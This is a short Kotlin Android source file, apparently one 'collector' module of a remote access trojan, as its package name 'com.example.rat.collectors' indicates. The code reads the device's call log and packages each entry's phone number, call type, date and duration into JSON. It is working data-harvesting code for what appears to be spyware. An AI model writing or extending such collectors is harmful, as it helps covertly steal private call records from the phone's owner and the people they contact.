package com.example.rat.collectors

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object CallLogCollector {
    fun get(context: Context, limit: Int): JSONArray {
        val out = JSONArray()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION
        )
        context.contentResolver.query(
            CallLog.Calls.CONTENT_URI, projection, null, null,
            CallLog.Calls.DATE + " DESC"
        )?.use { cursor ->
            var count = 0
            while (cursor.moveToNext() && count < limit) {
                out.put(
                    JSONObject()
                        .put("number", cursor.getString(0) ?: "")
                        .put("type", cursor.getInt(1))
                        .put("date", cursor.getLong(2))
                        .put("duration", cursor.getLong(3))
                )
                count++
            }
        }
        return out
    }
}
